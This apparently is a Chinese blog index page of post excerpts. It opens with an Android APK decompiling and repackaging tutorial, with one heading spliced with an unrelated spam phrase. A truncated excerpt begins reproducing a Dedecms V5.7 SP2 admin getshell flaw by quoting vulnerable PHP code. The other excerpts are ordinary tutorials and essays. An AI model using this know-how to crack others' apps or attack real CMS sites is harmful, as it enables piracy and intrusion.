		在学Android应用开发，在想既然是用Java开发的应该很好反编译从而得到源代码吧，google了一下，确实很简单，以下是我的实践过程。
在此郑重声明，贴出来的目的不是为了去破解人家的软件，完全是一种学习的态度，不过好像通过这种方式也可以去汉化一些外国软件。
一、反编译Apk得到Java源代码
首先要下载两个工具：dex2jar和JD-GUI
前者是将apk中的classes.dex转化成Jar文件，而JD-GUI是一个反编译工具，可以直接查看Jar包的源代码。
具体步骤：
首先将apk文件，将后缀改为zip，解压，得到其中的classes.dex，它就是java文件编译再通过dx工具打包而成的；
解压下载的dex2jar，将classes.dex复制到dex2jar.bat所在目录。在命令行下定位到dex2jar.bat所在目录
运行
dex2jar.bat classes.dex
生成
classes.dex.dex2jar.jar
生成jar文件的截图如下：
运行JD-GUI（jd-gui.exe），打开上面生成的jar包，即可看到源代码了
HelloAndroid源码（编译前的apk源码对照）如下：
二、反编译apk生成程序的二手游戏账号转让平台源代码和图片、XML配置、语言资源等文件
如果是只是汉化软件，这将特别有用。
首先还是下载工具，这次用到的是apktool
具体步骤：
将下载的两个包解压到同一个文件夹下，应该会有三个文件：aapt.exe，apktool.bat，apktool.jar
在命令行下定位到apktool.bat文件夹，输入以下命令：apktool d C:\*.apk C:\*文件夹，如下图：
命令行解释：apktool d [apk文件 ] [输出文件夹]
反编译的文件如下（AndroidManifest.xml为例）：
特别注意：你要反编译的文件一定要放在C盘的根目录里
将反编译完的文件重新打包成apk，很简单，输入apktool b c:\***文件夹（你编译出来文件夹）即可，命令如下：
打包apk后的文件在目录C:\HelloAndroid下，生成了两个文件夹：
build
dist
其中，打包生成的HelloAndroid.apk，在上面的dist文件夹下，Ok
注：本android反编译教程，是在Windows 7 Ultimate 64bit ，测试通过
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d84d8a4e062312f5340ef60195aed3f7/" rel="bookmark">
			基于人工智能的多肽药物分析问题-项目综述2021SC@SDUSC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 2021SC@SDUSC
背景综述 药物发现和研发是制药企业和化学科学家的重要研究领域。然而，低效率和高成本给该领域带来了障碍。此外，处理来自基因组学、蛋白质组学、微阵列和临床试验的大量复杂数据也存在挑战。人工智能和机器学习技术使制药领域实现了现代化。机器学习和深度学习算法已被应用于多肽合成、虚拟筛选、毒性预测、药物监测和释放、药效团建模、定量构效关系、药物重定位、多药理和生理活性等药物发现过程。其中，在多肽与蛋白质的研究领域里，药物靶标亲和度(DTA)预测、肽与HLA分子结合预测、多肽的三级结构预测等问题也是当下无论是在聚焦度还是应用方面都有很高的发展价值的。
项目分工 我的部分：药物靶标亲和度(DTA)预测问题
DTA背景综述 药物靶标亲和度(DTA)预测是计算机辅助药物设计中最重要的一步，可以加快药物开发速度，减少资源消耗。随着深度学习的发展，将深度学习引入到DTA预测中，提高DTA预测的准确性已成为研究的热点。
在药物开发中的一大难点是实验测量或模拟计算得到大量现有药物分子与靶点的相互作用，以及药物分子与脱靶蛋白的意外相互作用。药靶结合的强度常用结合亲和性常数来描述，包括解离常数（Kd）、抑制常数（Ki）和最大半抑制浓度（IC50）等指标。实验测量结合亲和性常数费时费力，因此计算方法得到药物开发者的青睐。
基准论文 DeepDTA开创了一个预测药靶亲和力值的先河，为什么这么说呢，以往的研究重点在于药靶是否结合，是作为一个二分类问题研究，而DeepDTA建立的模型将其视为一个回归问题，由此可以在更加精准的程度上去预测药靶的结合力度，而不是单纯的是否结合。该问题领域后续的相关文章几乎均以DeepDTA方法为框架进行改进并将实验结果与之作比较，得以评判优劣，所以分析与复现本文代码与模型对于开始本领域问题的研究有着重大意义。
论文题目：DeepDTA: Deep Drug-Target Binding Affinity Prediction
项目流程 分析代码
↓
复现论文
↓
优化模型
↓
搭建平台（待定）
代码下载
github：https://github.com/hkmztrk/DeepDTA/
下载到的deepPurpose库源码
DTI部分的代码：
DeepPurpose库安装 DeepPurpose库
用于DTI预测的DL模型可以表述为编解码器架构(Cho等，2014)。DeepPurpose库实现了统一的编码器-解码器框架，这使得该库具有独特的灵活性。只需指定编码器的名称，用户就可以自动地将感兴趣的编码器与相关的解码器连接起来。然后DeepPurpose以端到端的方式训练相应的编码器-解码器模型。最后，用户通过编程或可视化界面访问训练好的模型，并使用该模型进行DTI预测。
需要提前配置conda环境
pip conda create -n DeepPurpose python=3.6 conda activate DeepPurpose conda install -c conda-forge rdkit conda install -c conda-forge notebook pip install git+https://github.com/bp-kelley/descriptastorus pip install DeepPurpose 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b874f418f7fab0768de6c8693cc0a213/" rel="bookmark">
			nodejs把body的数据解析出来，如何使用http-proxy-middleware做转发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		nodejs把body的数据解析出来，如何使用http-proxy-middleware做转发 实现需求错误代码修正后的代码 实现需求 由于最近上线的活动经常被撸羊毛，需要在客户端添加签名，node端进行验证，加签的方式是对接口发送的参数进行加密，node端进行解密验证。get 请求的时候没什么问题，但是 post 请求会报 ECONNRESET 错误
错误代码 const proxyMiddleware = require('http-proxy-middleware'); app.use(bodyParser.urlencoded({ extended: true })); app.use(bodyParser.json()); ​ let Proxy = proxyMiddleware('/otherApi/**', { target: 'https://xxx.xxx.xxx', pathRewrite: { '/otherApi': '/api' }, ws: false, changeOrigin: true, onProxyReq: function (proxyReq, req, res, target) { console.log('----代理地址----'); console.log(target.target.href + proxyReq.path); }, onProxyRes: function (proxyRes, req, res) { }, onError: function (err, req, res) { res.json({code: '-998', msg: '转发异常', action: req.path}); } }); app.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b874f418f7fab0768de6c8693cc0a213/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d857deae6fff5aaad97cea170020996/" rel="bookmark">
			安装 ubuntu18.04 出现 Device/Credential Guard 不兼容、启动蓝屏等问题的解决思路
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		事件的起因是想在vmware 12 pro中安装ubuntu18.04。经过数日崩溃终于安装成功了，如果您也遇到了相似的情形，愿能为您提供解决思路，如能为您解决问题，不胜荣幸！
本人电脑系统环境为win10，版本号为20H2 第一种错误（事件1：Kernel panic-not syncing fatal exception in interrupt，崩溃）第二种错误（事件2：vmware 14/15安装ubuntu18.04启动后主机蓝屏，崩溃+1）第三种错误（事件3：Device/Credential Guard 不兼容”错误，崩溃+2）结果 第一种错误（事件1：Kernel panic-not syncing fatal exception in interrupt，崩溃） 1、第一次错误：新建虚拟机选择-&gt;自定义，进入新建虚拟机向导，硬件兼容性选 Workstation 12.x，其他配置好后开启虚拟机进行安装，结果出现黑屏白字最后一行提示：Kernel panic-not syncing fatal exception in interrupt。
2、可能的解决方式：
选择 6.5-7.x 或者 6.0 的可以正常安装，并能进入桌面。但我的机器是关机重启后便黑屏且只能看见鼠标（移动还能看到“工”型光标，我猜是移动到了密码输入栏，但是不显示桌面）。无奈删除。
第二种错误（事件2：vmware 14/15安装ubuntu18.04启动后主机蓝屏，崩溃+1） 1、背景：我卸载了 vmware 12 pro ，安装 vmware 14 pro（后又尝试安装了 vmware 15 pro）。
第二次错误：新建虚拟机常规步骤做好以后，开启虚拟机，紧接着出现蓝屏，提示：SYETEM-SERVICE-EXCEPTION。电脑重启（n次）。
2、解决方式：
禁用 HV 主机服务、禁用 Hyper-V。
进入系统服务（直接在 win10 底部搜索栏中搜服务），将红框中的所有服务禁用。
注意：必须右键点击属性，在启动类型中选禁用！
说明：如果您的问题仍未解决，看看文末参考链接中第一步再试试。
第三种错误（事件3：Device/Credential Guard 不兼容”错误，崩溃+2） 1、背景：虽然蓝屏问题解决了，但是 vmware 14/15 pro 不能打开 vmware 12 pro 创建的虚拟机。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2d857deae6fff5aaad97cea170020996/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ea86775b2cbc45a896b874f30f984a72/" rel="bookmark">
			clickhouse 在货拉拉的应用实践，千亿级别数据实现秒级查询
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：扬大平仔
前携程、网易高级工程师，现为货拉拉高级工程师。热爱技术，敢于将新技术用于项目实践。
前言
为了解决线上问题定位慢，相应不及时等问题。所以我们决定开发一套智能问题定位系统。对于我们的一些核心系统，每个订单会对应推送多个司机（线上最多达到上千个司机，平均也有几百个司机）。如果要每个司机都记录一条埋点信息那么数据量将会非常庞大，目前埋点数据日均60+亿，一个月接近2000亿数据。这种以司机维度存储数据会存在大量的数据冗余，耗费大量存储等机器资源。并且传统的关系型数据库在动则几十亿到上千亿级别的表上查询，几乎做不到秒级响应。前期我们调研的时候考虑过使用hbase 、druid、kudu等，但这些要么不太适合我们的业务要求，要么就是公司还不支持。后来调研了clickhouse 后，如沐春风。使用clickhouse 能够绝佳的满足我们的需求。首先，clickhouse 不但查询速度快，而且能够像mysql 那样支持多维度查询；其次，clickhouse 的嵌套类型 能够很好的满足我们订单和司机一对多的存储要求。调研后决定存储复合结构数据，即订单维度存储，一个订单对应多个司机。
一、什么是clickhouse？
ClickHouse是一个用于联机分析(OLAP)的列式数据库管理系统(DBMS)。ClickHouse是Yandex(俄罗斯最大的搜索引擎)开源的一个用于实时数据分析的基于列存储的数据库，其处理数据的速度比传统方法快100-1000倍。ClickHouse的性能超过了目前市场上可比的面向列的DBMS，每秒钟每台服务器每秒处理数亿至十亿多行和数十千兆字节的数据。
详细可以移步官方文档：什么是ClickHouse？ | ClickHouse文档
二、ClickHouse在具体业务的实践
1.系统基本设计
为了更好的收集机构化的数据，我们自己开发了一款埋点sdk用于收集各业务放的埋点日志，日志统一异步发送Kafka，然后我们在大数据平台使用flink消费Kafka数据，经过一定处理后写入click house。然后我们也开发了一个专门用于在线查询的系统对外提供查询服务。
2.具体实现
flink 摄入 因为写clickhouse底层都是使用httpclient的方式写入的，所以对于clickhouse来说单条频繁写入效率很低，适合批量写入。官网建议没批次写入100000+条（要视flink TM 内存大小调整，防止批量过大出息oom）。我们自定义了sink 用于摄入clickhouse，达到一定批次或者执行checkpoint时就写入一次。
clickhouse 部署 为了实现高可用，在具体部署上我们采用的是多副本，写本地表查分布式表。ck的表分为两种:
分布式表：
一个逻辑上的表, 可以理解为数据库中的视图, 一般查询都查询分布式表. 分布式表引擎会将我们的查询请求路由本地表进行查询, 然后进行汇总最终返回给用户。
本地表:
实际存储数据的表
1. 不写分布式表的原因
分布式表接收到数据后会将数据拆分成多个parts, 并转发数据到其它服务器, 会引起服务器间网络流量增加、服务器merge的工作量增加, 导致写入速度变慢, 并且增加了Too many parts的可能性.
数据的一致性问题, 先在分布式表所在的机器进行落盘, 然后异步的发送到本地表所在机器进行存储，中间没有一致性的校验, 而且在分布式表所在机器时如果机器出现down机, 会存在数据丢失风险.
数据写入默认是异步的，短时间内可能造成不一致.
2. Replication &amp; Sharding
ClickHouse依靠ReplicatedMergeTree引擎族与ZooKeeper实现了复制表机制, 成为其高可用的基础。ClickHouse像ElasticSearch一样具有数据分片(shard)的概念, 这也是分布式存储的特点之一, 即通过并行读写提高效率. ClickHouse依靠Distributed引擎实现了分布式表机制, 在所有分片（本地表）上建立视图进行分布式查询。
三、线上问题以及解决方案 3.1 线上问题 问题1： 司机明细相关业务查询极其缓慢，一个查询往往要耗时15s， 订单明细相关查询却很快。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ea86775b2cbc45a896b874f30f984a72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/55cd07983b05d80e04414bf1e498eb43/" rel="bookmark">
			android项目内导入zxing库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		android项目内导入zxing库亲测有效 第一篇博客，虽然有点羞涩但是确实还是想记录一下学习zxing导入的使用方法，简单实现一下生成二维码与扫描二维码的功能，后期会继续出生成二维码与扫描二维码的文章，刚开始接触网上的很多博客找了好像用处都不大，亲测有效吧。新手勿喷。
这里将github zxing的链接放在下面：
https://github.com/zxing/zxing
1.将github内的android包import model
2.导入zxing包内的android库
3.在zxing的build包内导入zxing依赖包。
implementation ‘com.google.zxing:zxing-parent:3.4.1’
implementation ‘com.google.zxing:core:3.3.3’
4.zxing android包内缺少CameraConfigurationUtils，在zxing camera文件夹下
文件在android-core文件夹内。
5.导入后要记得将导入的包作为库进行使用修改方法如下：
将plugin修改为”com.android.library”
最后再次在open model setting内选择app导入添加model dependency导入zxing：
导入成功后编译会报：
不用担心，根据提示点击进去你会发现所有报错的地方都有一个共同点，那就是都用了switch语句，然后你要做的就是将所有的switch语句换成if语句就可以，这是因为对比普通工程和Library工程的R文件发现，Library工程的R文件常量缺少final。由于Library工程的可以包含资源文件，编译会生成R文件，多个Library中可能出现id冲突的问题。为了解决这个问题谷歌将Library工程R文件才从静态常量变为非常量。然而switch语句的case中 必须是常量，而此时的R.id.xxx为非常量，所以报错了。按照提示修改成功后写一个button.就可以成功运行起来了。
但启动后是横屏，将扫码界面修改为竖屏。修改：
android:screenOrientation=“sensorPortrait”
若遇到以下问题则:
改完所有的switch语句之后，运行还是会发现一个错误，如下图：
这个不用担心非常好改，将ArrayList中的类型补全就好了。如下图：
至此zxing就导入到你的项目中去了，在自己的应用中启动CaptureActivity就可以进行扫描了。
至此文件将会运行成功。同时记得在导入文件的同时要修改版本号和zxing文件mainferst文件的label标签木得是为了不要让原本自身的App图标与导入的图标冲突
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6690ad1feab5ef8973160cddb0a92ef/" rel="bookmark">
			IDEA Database 配置数据库出现Server returns invalid timezone. Go to ‘Advanced‘ tab and set ‘serverTimezone
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错翻译过来就是：服务器返回无效的时区。 转到“高级”选项卡并手动设置“serverTimezone”属性。
所以我们前往Advanced里面找到serverTimezone属性
我们可以点击箭头排序找到serverTimezone，value的值设置成Asia/Shanghai，然后我们就可以链接数据库了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f78632ca5c695809baceaabcaa69d0ea/" rel="bookmark">
			2021年计算机保研总结（北师大&#43;山大&#43;大连理工&#43;东北大学&#43;信工所&#43;哈工大&#43;北航）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		随便说点儿什么 昨天推免系统开放，接收了北航的拟录取，我的保研之路就到此结束了，回想这半年，起起落落，恍恍惚惚，最终去到了自己的梦校，也算是功德圆满了。趁着今日无事，记录一下这半年的经历，也给后人留下些有参考价值的经验。
另外，当前网上大多数的计算机保研经验贴大佬居多，而保研过程中最多，最难受的其实还是本科不算太好，成绩不算太好，科研不算太好的学生，也希望我这篇帖子能给那些本科不好，rank不高，缺少科研的人一点帮助。
从夏令营说起 个人情况 本科学校： 某中流211
专 业： 计算机科学与技术（学科评估还算不错）
成 绩： 2.5%（因为学院人数多，所以rank并不高）
英 语： 六级475（勉强够用）
科 研： 基本上没有科研经历，几个数模竞赛的水奖，约等于无
以上就是我的基本情况，可以看出来，基本上是啥都不行，成绩不高，rank不好，本科一般，还没有科研竞赛，所以奉劝那些大一，大二准备保研的同学们，没事儿去联系下实验室，去实验室里学点儿东西，最好能发一篇论文，实在不行去多水点互联网+，程序设计竞赛，蓝桥杯这类的，至少你的简历能看起来更丰富一些。
笔者的个人想法：坚决不直博，专硕学硕无所谓，只要有宿舍，北京优先级最高，往南不能过长江（离家太远），导师人品优先，学术次之。梦校北航北理，北航&gt;北理。
夏令营填报情况 因为知道自己水平不高，所以选择了海投，只要你敢开，我就敢报的原则进行填报，基本要求是985或者中科院研究所，反正上至清北华五，下到山大川大吉大，冲就完了。但我没报北航，原因后面再说。
这里提醒各位，海虽然不好，但报不报是一回事，要不要你，去不去又是另一回事，在大家都海投的基础上，你根本不知道有的学校的bar（门槛）多高或者多低，比如北理今年基本是非985和211前几不要，门槛很吓人，而浙江大学软件学院，基本是你报了就能去，入营1400+，所以你永远不知道哪个学校会给你机会。
夏令营入营和参加 入营的学校有：吉林大学软件学院，山东大学计算机学院，大连理工大学软件学院，中山大学人工智能学院，华南理工大学计算机学院，华中科技大学网络安全学院，北京师范大学人工智能学院，中科院信工所（第二批），浙江大学软件学院，哈工大计算学部。
参加的夏令营几乎是能错开时间去的就去，错不开的择优去，因此参加的夏令营有：山东大学计算机学院，大连理工大学软件学院，北京师范大学人工智能学院，中科院信工所（第二批）
中山大学能给为入营让我很诧异，不过后来调查知道，人工智能学院近几年刚开的学院，位置在珠海所以门槛比较低，但跟山东大学冲突了，遂放弃。不是中山大学不好，楼主北方人，倾向于靠近自己家乡读研，基于此也放弃了华南理工大学的计算机学院。
放弃哈工大是因为今年工大线下，离太远了，不想去，但是基本去了的都要了，而且群里基本全是哈工程的，还有吉大，东北大学的，看来哈工大确实是东北的老大哥，尤其对工程的照顾简直是亲妈级别了。
北京师范大学-人工智能学院 北师大的计算机算是中规中矩吧，不是他的优势学科，因此门槛比起北师大的名气来说很低。北师大今年的招生比较严格而且没有任何花里胡哨，好感度很高。
具体流程：机试+论文阅读+面试（论文阅读内容介绍+英语面试+项目）
机试的问题不难，但是刷人，一共五道题目，第一题签到题，第二题略需要技巧，一般做出两道题就稳进面试机试完了之后，第二天早上会发短信进入新的面试群，然后发两篇英文论文给你一上午时间阅读，论文内容不难，科普类的，不限手段，你可以上网查资料，也可以求助外援都不禁止，需要做PPT面试先是让你用PPT介绍你读的论文，然后英语自我介绍，英文问答，中文项目什么的问一下 结果：大概五天后出结果，最终拿到了北师大的学硕；
评价：北师大每年招生人数挺少的，因此筛选出来就感觉很难，我很多同学都过了初筛，但是最终都很难通过面试。而且招生过程很规范严格，给人感觉还不错，没有海也没有骚操作，录取就是录取，哪怕你不联系老师，只要你不放弃就可以在系统填报，完全是诚信学校。
我个人觉得北师大作为师范类的龙头学校的title是很足够的，而且好老师挺多的，像是黄华老师，武仲科老师，邬霞老师，但本身其计算机学科确实不强。作为我拿到的第一个offer，很感谢北师大，给我能够冲下去的勇气，我把它作为了自己的保底，也没联系老师，因此最后鸽的时候招生办老师的态度也很好，不像今年某西安C9威逼利诱。
山东大学-计算机学院 山大计算机现在搬到青岛了，虽然地域偏了点儿，但环境很好，住宿也挺不错的，我有同学在哪儿读本科，对哪儿评价很高，而且离家很近，所以我推了中山去参加。
流程：机试+面试，就两部分，最终两部分分加起来排序，大概五天出结果，算是挺公开透明了，机试难度很大，虽然就三道题，但是每道难度都在CSP第四题的难度（个人感觉），所以建议大家好好练机试，我最终机试只拿了几十分，面试分中上等吧，但机试分太低了，因此被刷了。
另外，不得不提，山大组织的很麻烦，诚信承诺书啊，机试录屏啊，MD5码啊，反复折腾，虽然确实严格但太麻烦了，录屏还得必须用一个很难用的录屏软件，我捣鼓了半天才弄好那个录屏。有点儿掉好感度。
OK，fine，收拾好心情再出发吧，可惜我中山的夏令营了，呜呜呜
大连理工大学-软件学院 大连理工大学的计算机好像没举办夏令营，软件学院夏令营还不错，宣讲一上午，下午只面试。每人二十分钟（这里加一句啊，感觉面试少于十分钟的学校看背景和人品的比例大于你的表现），十分钟是自我介绍，这个自我介绍可太顶了，十分钟我都把自己学的专业课拿出来侃了，所以建议兄弟们一定得好好做科研竞赛，要不然都没得说，嘤嘤嘤。
我自我感觉挺好的，老师提问什么的都很融洽，当时面完自信心还挺爆棚的，觉得自己应该没问题，没想到最后被刷了，唉，当时被山大和大工拒掉心情还挺失落的，因为我感觉这两个学校必然能拿到的，失落了好久。
东北大学-计算机学院 东北大学虽然是双一流B类大学，但是计算机学院实力还是挺强的，宣讲是通过B站的直播进行的，感觉还挺有意思的，大家刷弹幕巨快乐，而且老师会在宣讲的时候在群里点名，直播的时候应该是本校都在现场听，它承诺录取85%的初筛通过的同学，虽然分本校和外校分别考核，但基本上大家都能过。所以面试就走了走流程。
但是，东北大学7月18号左右结束的，一直到9月15日才出结果，那时候东北大学的预推免都要结束了，可能是为了让鸽子飞一会儿？反正很迷惑。这个体验很掉好感。不过当时已经有了工大offer了，也就立马放弃了。
信工所 信工所是中科院下属研究院，有一个国家重点研究室，在网络安全方面很厉害，去国重的清北很多。但室与室之间差距很大，室内各个组方差也很大，大家一定要擦亮眼睛。
当时收到信工所的面试通知已经是第二批招生了，不像第一批可以自己联系老师，这一批是哪儿有名额去哪儿，我是被第五室联系了，然后去面试的。
面试二十分钟左右，英语问答，然后大体问一下项目，会稍微深刻一点问一问你的项目，问我numpy库的优点，python的list怎么添加数据这类的。整体面下来挺顺利的，基本是有问有答，十分融洽，最后问选学硕还是专硕，我说学硕（貌似研究所的专硕更抢手？反正感觉老师听说选学硕还挺高兴的）
顺利拿到offer，去评价网，知乎看了看评价，大家可以自己去看，而且因为是临时被通知去面试的也没联系老师，估计那会儿好老师也没坑位了，遂放弃，但是听说信工所最后被鸽穿了，填系统前几个小时发邮件让你去复试。
至此，夏令营基本结束了，不得不说，今年计算机保研圈子是真的卷，而且学校因为去年鸽子乱飞的情况，都开始整活，有的超发百分之四百的offer，你鸽任你鸽，鸽穿算我输，有的学校优秀营员不给录取资格，只能优先进入预推免选拔，总之，对大佬来说影响不大，对我们这些中间不上不下的人来说真是煎熬。
预推免，冲！ 我前面提到了梦校是北航和北理，那我为啥夏令营不去呢？
首先是北航，因为那时候老去看经验贴，刷题，复习，看到北航夏令营写着如果本次夏令营不通过，不允许报考下面的预推免，当时七月初，我刚结束考试，北航以面试硬核出名，很难水，所以我就想着预推免再说，不过我当时缺乏调查了，信息没搞好。北航历年预推免都是照顾本校的，基本百分之八十都是本校录取，去年也只要了十几个外校的，都是北理，北邮，华科这种牛校，所以大家一定接受教训，充分做好调研。
其次是北理，这个理由就很简单了，今年北理的门槛直接爆炸，去不了，呜呜呜呜。
总之，预推免的追求就是北航北理的计算机相关学院，至少拿一个中九的offer！
报名情况：哈工大计算学部，浙大工程师学院，北航计算机学院，北航网安学院，北航人工智能学院，北航软件学院，北理计算机学院，北理网安学院
还有我第六学期成绩还算不错，把rank提升到了1%，感觉只要不是华五，应该不会被硬卡rank了。
哈工大预推免 工大预推免好像是第一批和第二批一起举办了，而且就进入情况看，基本是本部+哈工程+吉大+大工+东北大学+其他差一点的985+合工大。听保研群里说，今年工大优先考虑985，连武汉理工大学都没有机会进去，但是对哈工程还挺照顾的，听说rank 十几都可以去，并且录取，亲妈级别的照顾*2.
工大的面试很特殊，分四个部分：项目+日常情商问题+逻辑面试+专业课，没有英语问题，项目和情商问题只要大家不要胡言乱语应该是没什么区别的，逻辑面试类似于脑筋急转弯，建议大家去看看程序员逻辑面试75题，里面简短的题目很有可能问到，我印象很深的是被问到了“给你若干根绳子，每根绳子都不均匀，从一头烧需要一个小时，问怎么计时45分钟”，这是三体3里面提到过的问题，因此我回答还算是顺利，专业课问的范围很广，计网，数据库，操作系统都有，建议好好复习。
最终拿到了offer，因为感觉今年冲北理和北航可能很难了，而且工大的计算机全国很有名，双一流建设学科，有赛尔实验室，NLP也很牛，所以就联系了一个很有名的NLP组的老师，老师人品很好，我感觉也挺满意的，想着大概率会去哈工大了，于是躺平了一段时间。
总之，能去哈工大还是香的，毕竟也是C9高校，虽然地域偏僻，但两年半就毕业，认可度也很高，基本是性价比溢出了，但是今年哈工大招生办确实骚操作太多了，保研群里怨声四起。想了解的同学可以自行搜索。
峰回路转—北航计算机 我本以为以我的情况，可能北航够呛，但北理应该能进面试的，而且北理因为卡title，我觉得进入面试能够通过机率很大，但是万万没想到，北理对我做了致命一击。
北理计算机招生18号才开始，然后发邮件通知，据说某211 rank1没进去，某985 3%没进去，某另一985 4%也没进去，我本来还觉得应该能去的，万万没想到啊，这给我的信心致命一击，我直接颓了。一直梦想着去北京，到最后竹篮打水一场空。如果没有一开始那么大希望也还好，可一开始觉得自己能做到，现在连机会都不给，让我特别难受。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f78632ca5c695809baceaabcaa69d0ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a516dd7b85e2c4b104d330071e728931/" rel="bookmark">
			Dedecms V5.7 sp2后台getshell漏洞复现(第一处)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：为了简便，试用了phpstudy
下载dedecms V5.7 sp2
使用phpstudy新建网站www.dedtest.com，并将下载的dedecms V5.7 sp2复制到其网站目录下，然后建站
开始复现
漏洞的只要原因是出现在了C:\phpstudy_pro\WWW\www.dedtest.com\dede文件夹下的sys_varifiles.php文件，一下为代码：
/*----------------------- 下载文件 function _getfiles() ------------------------*/ else if ($action == 'getfiles') { if(!isset($refiles)) { ShowMsg("你没进行任何操作！","sys_verifies.php"); exit(); } $cacheFiles = DEDEDATA.'/modifytmp.inc'; $fp = fopen($cacheFiles, 'w'); fwrite($fp, '&lt;'.'?php'."\r\n"); fwrite($fp, '$tmpdir = "'.$tmpdir.'";'."\r\n"); $dirs = array(); $i = -1; $adminDir = preg_replace("#(.*)[\/\\\\]#", "", dirname(__FILE__)); foreach($refiles as $filename) { $filename = substr($filename,3,strlen($filename)-3); if(preg_match("#^dede/#i", $filename)) { $curdir = GetDirName( preg_replace("#^dede/#i", $adminDir.'/', $filename) ); } else { $curdir = GetDirName($filename); } if( !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a516dd7b85e2c4b104d330071e728931/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93a433dd8724be3e2ca8faf3c0c664ed/" rel="bookmark">
			U-Boot简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		U-Boot简介 一、什么是U-Boot Linux 系统要启动就必须需要一个 bootloader 程序，也就说芯片上电以后先运行一段bootloader程序。这段bootloader程序会先初始化DDR等外设，然后将Linux内核从flash(NAND，NOR FLASH，SD，MMC 等)拷贝到 DDR 中，最后启动 Linux 内核。
uboot是一个裸机程序，比较复杂。uboot就是一个bootloader，作用就是用于启动Linux或其他系统。Uboo最主要的工作就是初始化DDR。因为Linux是运行在DDR里面的。一般Linux镜像zlmage(ulmage)+设备树(.dtb)存放在SD、ENNC、NAND、SPI、FLASH等等外置存储区域。Uboot是个通用的bootloader，它支持多种架构。 U-Boot官网
下面是一些提供uboot代码的具体信息：
种类描述uboot 官方的uboot 代码由 uboot 官方维护开发的 uboot 版本，版本更新快，基本包含所有常用的芯片。半导体厂商的 uboot 代码半导体厂商维护的一个 uboot，专门针对自家的芯片，在对自家芯片支持上要比 uboot 官方的好。开发板厂商的 uboot 代码开发板厂商在半导体厂商提供的 uboot 基础上加入了对自家开发 二、U-Boot编译 将正点原子的Uboot和Linux出场源码复制到Ubuntu下，将其解压到新建的一个文件夹alentek_uboot中 ，并打开终端。我使用的是 512MB+8GB 的 EMMC 核心板，使用如下命令来编译对应的 uboot，在终端中输入以下的命令。
make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf mx6ull_14x14_ddr512_emmc_defconfig make ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- mx6ull_14x14_ddr512_emmc_defconfig make V=1 ARCH=arm CROSS_COMPILE=arm-linux-gnueabihf- -j12 这三条命令中 ARCH=arm 设置目标为 arm 架构，CROSS_COMPILE 指定所使用的交叉编译器。
第一条命令相当于“make distclean”，目的是清除工程，一般在第一次编译的时候最好清理一下工程。
第二条指令相当于“make mx6ull_14x14_ddr512_emmc_defconfig”，用于配置 uboot，配置文件为 mx6ull_14x14_ddr512_emmc_defconfig。
最后一条指令相当于 “make -j12”也就是使用 12 核来编译 uboot。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/93a433dd8724be3e2ca8faf3c0c664ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8bcde030834e67e999947392bcffffe/" rel="bookmark">
			python计算中奖问题的概率
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目：抽奖中，宝箱中奖概率是20%，抽5个能不能保证100%中奖？ 很显然，只要样本不是小于等于5个，那自然不能保证了
下面，我们用python来模拟一下这个抽奖的过程，这里用统计频率代替概率
import random p = 0.2 # 其实没用到这个变量 # 产生一个100万个元素，且有80万个0,20万个1的列表， # 0代表没中奖，1代表中奖 lis=[0 for _ in range(800000)]+[1 for _ in range(200000)] # 将这里元素打乱位置 random.shuffle(lis) lis def test(lis): count = 0 for i in range(200000): # 抽奖20万次 temp = random.sample(lis,k=5) # 每次抽奖5个号 if 1 in temp: # 如果有1就判断中奖了 count += 1 # 统计中奖次数 return count # 返回中奖次数 print(test(lis)/200000) 结果：
所以，知道彩票一次买几张到底有没有提高中奖概率了吧。
不说了，今天一次买了100张，现在在肉疼。
如果宝箱中奖概率为5%呢？快去算一算吧。
想了解更多知识，欢迎移步到微信公众号
扫码或搜索数据分析者
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/50c72703e6b32535b99506309bb22cf4/" rel="bookmark">
			leetcode437. 路径总和 III
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		437. 路径总和 III
难度中等1075
